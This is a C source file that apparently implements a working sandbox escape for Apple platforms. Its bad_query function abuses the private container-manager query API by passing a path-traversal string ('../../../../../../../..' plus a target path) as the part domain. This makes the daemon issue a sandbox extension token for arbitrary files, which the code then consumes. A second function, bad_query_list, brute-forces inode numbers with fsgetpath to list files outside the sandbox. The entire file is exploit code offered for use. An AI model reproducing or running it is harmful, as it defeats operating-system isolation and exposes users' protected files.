#include "bad_query.h"
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <errno.h>
#include <string.h>
#include <sys/stat.h>
#include <xpc/xpc.h>
#include <sys/mount.h>
#include <sys/fsgetpath.h>

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void (*container_query_set_part_domain_fn)(void *, const char *);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);

#define BAD_QUERY_ERR(fmt, ...) fprintf(stderr, "[bad_query] " fmt "\n", ##__VA_ARGS__)

int64_t bad_query(char* path, bool create, char *group_identifier, bool is_group) {
    if (!path || path[0] != '/') return -255;
    if (!create) {
        struct stat st;
        if (lstat(path, &st) != 0) {
            BAD_QUERY_ERR("lstat failed path=%s errno=%d (%s)", path, errno, strerror(errno));
            return -254;
        }
    }

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) {
        BAD_QUERY_ERR("dlopen containermanager failed path=%s errno=%d (%s)", path, errno, strerror(errno));
        return -1;
    }

    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_set_part_domain_fn query_set_part_domain = (container_query_set_part_domain_fn)dlsym(mgr, "container_query_operation_set_part_domain");
    container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

    int64_t handle = -1;
    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags || !query_set_part || !query_set_part_domain || !query_get_single_result || !query_free || !copy_sandbox_token || !consume_extension) {
        BAD_QUERY_ERR("missing symbols path=%s create=%d query_create=%p set_class=%p set_group=%p set_flags=%p set_part=%p set_part_domain=%p get_single=%p free=%p copy_token=%p consume=%p",
            path, create, (void *)query_create, (void *)query_set_class, (void *)query_set_group_identifiers, (void *)query_set_flags, (void *)query_set_part, (void *)query_set_part_domain, (void *)query_get_single_result, (void *)query_free, (void *)copy_sandbox_token, (void *)consume_extension);
        dlclose(mgr);
        return -1;
    }

    void *query = query_create();
    if (!query) {
        BAD_QUERY_ERR("query create failed path=%s", path);
        dlclose(mgr);
        return -2;
    }

    xpc_object_t identifier;
    if (group_identifier == NULL) {
        query_set_class(query, 13);
        identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
    } else {
        query_set_class(query, 7);
        identifier = xpc_string_create(group_identifier);
    }
    query_set_group_identifiers(query, identifier);
    query_set_part(query, 3);
    char *part = NULL;
    if (group_identifier == NULL) {
        if (asprintf(&part, "../../../../../../../..%s", path) != -1) {
            query_set_part_domain(query, part);
        } else {
            BAD_QUERY_ERR("asprintf failed path=%s", path);
            xpc_release(identifier);
            query_free(query);
            dlclose(mgr);
            return -5;
        }
    } else {
        if (asprintf(&part, "../../../../../../../../..%s", path) != -1) {
            query_set_part_domain(query, part);
        } else {
            BAD_QUERY_ERR("asprintf failed group=%s path=%s", group_identifier, path);
            xpc_release(identifier);
            query_free(query);
            dlclose(mgr);
            return -5;
        }
    }

    if (is_group) {
        query_set_flags(query, 0x0000000800000000ULL);
    } else {
        query_set_flags(query, 0x0000008000000000ULL);
    }

    void *result = query_get_single_result(query);
    if (!result) {
        BAD_QUERY_ERR("daemon returned no result (denied?) path=%s part=%s", path, part);
        free(part);
        xpc_release(identifier);
        query_free(query);
        dlclose(mgr);
        return -3;
    }
    char *token = copy_sandbox_token(result);
    if (!token) {
        BAD_QUERY_ERR("daemon result contained no sandbox token path=%s part=%s", path, part);
        free(part);
        xpc_release(identifier);
        query_free(query);
        dlclose(mgr);
        return -4;
    }

    handle = consume_extension(token);
    free(token);
    free(part);
    xpc_release(identifier);
    query_free(query);

    dlclose(mgr);
    if (handle < 0) {
        BAD_QUERY_ERR("consume_extension failed path=%s handle=%lld", path, handle);
    }
    return handle;
}

void bad_query_release(int64_t handle) {
    if (handle < 0) return;
    sandbox_extension_release_fn release_extension = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release_extension) release_extension(handle);
}

char *bad_query_list(char *path, int64_t max_inode) {
    struct statfs sfs;
    if (statfs(path, &sfs) != 0) return NULL;
    fsid_t fsid = sfs.f_fsid;

    size_t cap = 65536;
    size_t length = 0;
    size_t path_length = strlen(path);

    char *out = malloc(cap);
    if (!out) return NULL;
    out[0] = '\0';

    char buf[1200];
    for (uint64_t ino = 1; ino <= max_inode; ino++) {
        ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, ino);
        if (n <= 0) continue;

        const char *p = buf;
        if (strncmp(p, "/private/var/", 13) == 0) p += 8;
        if (strncmp(p, path, path_length) != 0 || p[path_length] != '/') continue;
        if (strchr(p + path_length + 1, '/')) continue;

        size_t need = strlen(p) + 2;
        if (length + need > cap) { cap *= 2; char *t = realloc(out, cap); if (!t) break; out = t; }
        length += snprintf(out + length, cap - length, "%s\n", p);
    }
    return out;
}
